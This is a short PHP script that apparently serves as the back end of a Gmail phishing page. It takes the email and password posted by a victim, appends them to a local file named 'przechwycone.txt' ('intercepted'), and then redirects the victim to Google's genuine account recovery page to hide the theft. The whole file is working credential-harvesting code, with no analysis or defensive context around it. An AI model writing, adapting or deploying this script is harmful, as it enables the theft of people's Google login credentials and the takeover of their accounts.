<?php

file_put_contents("przechwycone.txt", "Gmail Login: " . $_POST['email'] . " Hasło: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
exit();
?>